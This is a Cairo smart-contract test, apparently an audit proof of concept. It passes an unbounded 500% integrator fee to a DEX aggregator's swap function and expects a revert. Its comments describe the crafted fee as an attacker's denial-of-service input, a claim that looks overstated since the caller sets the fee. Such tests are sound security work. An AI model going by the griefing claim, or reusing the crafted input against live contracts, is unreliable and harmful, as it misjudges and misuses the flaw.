#[test]
#[available_gas(20000000)]
#[should_panic(expected: ('Insufficient token from amount', 'ENTRYPOINT_FAILED'))]
fn poc_integrator_fee_bps_unbounded_causes_revert_feeonbuy() {
    // Given: Normal swap setup
    let (exchange, ownable, fee) = deploy_exchange();
    let beneficiary = contract_address_const::<0x12345>();
    let sell_token = deploy_mock_token(beneficiary, 120000, 1);
    let sell_token_address = sell_token.contract_address;
    let buy_token = deploy_mock_token(beneficiary, 0, 2);
    let buy_token_address = buy_token.contract_address;
    
    // Configure fee policy to FeeOnBuy (default: no special config needed)
    set_contract_address(ownable.get_owner());
    let fees_recipient = contract_address_const::<0x1111>();
    fee.set_fees_recipient(fees_recipient);
    
    let sell_token_max_amount = u256 { low: 120000, high: 0 };
    let sell_token_amount = u256 { low: 8000, high: 0 };
    let buy_token_amount = u256 { low: 100000, high: 0 }; // User expects 100k buy tokens
    
    let mut routes = ArrayTrait::new();
    routes.append(
        Route {
            sell_token: sell_token_address,
            buy_token: buy_token_address,
            swap: RouteSwap::Direct(
                DirectSwap {
                    exchange_address: contract_address_const::<0x12>(),
                    percent: 100 * ROUTE_PERCENT_FACTOR,
                    additional_swap_params: ArrayTrait::new(),
                },
            ),
        },
    );
    
    set_contract_address(beneficiary);
    sell_token.approve(exchange.contract_address, sell_token_max_amount);
    
    // ⚠️ MALICIOUS INPUT: 50,000 BPS = 500% integrator fee
    // For FeeOnBuy: integrator_fee = 100000 * 50000 / 10000 = 5,00,000
    // internal_buy_token_amount = 100000 + 500000 = 600000
    // This inflated target is passed to _swap_exact_token_to, causing the 
    // iterative loop to request far more sell tokens than sell_token_max_amount allows
    let integrator_fee_recipient = contract_address_const::<0x9999>();
    let integrator_fee_bps = 50000_u128; // 500% - ECONOMICALLY NONSENSICAL

    // When: Attacker submits swap with excessive integrator fee
    exchange.swap_exact_token_to(
        sell_token_address,
        sell_token_amount,
        sell_token_max_amount,
        buy_token_address,
        buy_token_amount,
        beneficiary,
        integrator_fee_bps, // ← Unbounded input
        integrator_fee_recipient,
        routes,
    );
    
    // Then: Transaction reverts inside _swap_exact_token_to loop with 
    // 'Insufficient token from amount' because the inflated target requires
    // more sell tokens than the user approved (sell_token_max_amount)
    // This is a DoS vector: attacker can grief any swap by inflating BPS
}
